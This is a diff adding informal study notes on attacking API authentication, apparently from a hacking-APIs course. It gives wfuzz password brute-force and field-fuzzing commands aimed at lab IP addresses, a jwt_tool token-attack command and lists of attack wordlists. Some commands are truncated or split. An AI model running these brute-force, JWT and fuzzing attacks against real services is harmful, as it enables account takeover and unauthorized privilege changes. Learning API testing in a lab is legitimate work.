@@ -77,3 +77,39 @@ example of api look like :    -> : or {} [] <> ।।
                 “blue” || “green” || “red”
 
 _________________________________________________________________________________________________
+                                        TACKING API AUTHENTICATION
+This chapter will guide you through classic authentication attacks like brute-force attacks and passwordspraying and then we’ll cover API-specific token attacks, such as token forgery and JWT attacks. 
+ 
+# for bruteforce attack use most usefull usr and passwd below this list
+                        https://github.com/sc0tfree/mentalist
+                        https://github.com/Mebus/cupp
+# bruteforcing tools -> burpsuite and wfuzz
+                wfuzz -d '{"email":"a@email.com","password":"FUZZ"}' --hc 405 -H 'Content-Type: application/json' -z file,/home/hapihacker/rockyou.txt http://192.168.195.130:8888/api/v2/auth
+# best wordlists for api end point
+                 https://github.com/hAPI-hacker/Hacking-APIs
+# use jwt    //jwt decode kwt token , example-->
+                        jwt (token)
+                        jwt_tool -t http://target-site.com/ -rc "Header: JWT_Token" -M p
+# api fuzzing //end point bruteforcing wordlists
+
+                https://github.com/danielmiessler/SecLists
+                https://github.com/fuzzdb-project/fuzzdb
+                https://github.com/xmendez/wfuzz
+                
+                try every string (~'!@#$%^&*()-_+)
+# deep fuzzing with wfuzz
+                 -> wfuzz -z file,/home/hapihacker/big-list-of-naughty-strings.txt
+                 ->wfuzz -z file,/home/hapihacker/big-list-of-naughty-strings.txt -H "Content-Type: application/json" -H "x-access-token: [...]"
+
+                 -> wfuzz -z file,/home/hapihacker/big-list-of-naughty-strings.txt -H "Content-Type: application
+                 json" -H "x-access-token: [...]" -p 127.0.0.1:8080:HTTP --hc 400 -X PU
+
+                 -> wfuzz -z file,/home/hapihacker/big-list-of-naughty-strings.txt -H "Content-Type: application/
+                        json" -H "x-access-token: [...]" --hc 400 -X PUT -d "{
+                        \"user\": \"FUZZ\",
+                        \"pass\": \"FUZZ\",
+                        \"id\": \"FUZZ\",
+                        \"name\": \"FUZZ\",
+                        \"is_admin\": \"FUZZ\",
+                        \"account_balance\": \"FUZZ\"
+                        }" -u http://192.168.195.132:8090/api/user/edit_inf
